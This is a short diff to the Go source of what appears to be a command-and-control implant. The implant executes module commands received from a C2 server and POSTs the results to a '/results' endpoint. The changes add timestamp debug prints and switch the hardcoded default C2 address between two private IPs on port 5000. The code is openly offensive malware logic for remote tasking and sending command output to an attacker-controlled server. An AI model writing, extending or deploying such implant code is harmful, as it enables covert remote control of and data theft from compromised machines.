@@ -160,6 +160,7 @@ func (i *Implant) executeTask(task Task) (string, error) {
 
 	// Execute module command
 result, err := module.Execute(task.Command,nil)
+	fmt.Println(time.Now())
 	if err != nil {
 		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
 	}
@@ -175,12 +176,12 @@ result, err := module.Execute(task.Command,nil)
 	if err != nil {
 		return "", fmt.Errorf("error marshaling response data: %v", err)
 	}
-
+	fmt.Println(time.Now())
 	_,_, err = i.sendHTTPRequest("POST","/results", responseDataBytes,true)
 	if err != nil {
 		return "", fmt.Errorf("error sending task response: %v", err)
 	}
-
+	fmt.Println(time.Now())
 	return result, nil
 }
 
@@ -263,7 +264,7 @@ func getOSVersion() string {
 func main() {
 	c2ServerURL := os.Getenv("C2_URL")
 	if c2ServerURL == "" {
-		c2ServerURL = "http://192.168.0.102:5000"
+		c2ServerURL = "http://192.168.137.1:5000"
 	}
 
 	implant := NewImplant(c2ServerURL)
